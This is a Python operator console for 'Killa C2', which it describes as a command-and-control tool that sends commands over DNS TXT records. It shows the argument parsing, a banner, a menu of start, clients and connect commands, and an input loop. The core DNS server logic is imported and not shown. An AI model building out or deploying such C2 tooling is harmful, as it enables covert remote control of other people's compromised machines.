import argparse
import os

from DNS import DNSServer, post

def getArgs():
    parser = argparse.ArgumentParser(description='Killa C2 is a DNS C2 utilizing DNS TXT records to perform commmands')
    parser.add_argument("-host", help="Used to start C2 on specified IP", required=True)
    parser.add_argument("-port", help="Uses this port to start the server", type=int, required=True)
    args = parser.parse_args()
    return args.host, args.port

def commands():
    print("\nList of commands:")
    print("-------------------------------------------------------")
    print("start\t\t\tStart the DNS Server")
    print("clients\t\t\tShow list of Availible Clients")
    print("connect\t\t\tConnect to a Client")
    print("help\t\t\tDisplay list of commands\n")

def greet():
    os.system('clear')
    print("**********************************************")
    print("****************  KILLA C2  ******************")
    print("**********************************************\n")


def main():
    host, port = getArgs()
    dns = DNSServer(port,host)
    dns = DNSServer(port, host)
    greet()
    commands()
    choice = ""
    while choice != "exit":
        choice = input("(killa) > ")
        if choice == "exit":
            break
        elif choice == "clear":
            os.system('clear')
        elif choice == "start":
            dns.start()
        elif choice == "clients":
            dns.showClients()
        elif choice == "connect":
            client = dns.select()
            post()
            dns.start(client)
        elif choice == "help":
            commands()

main()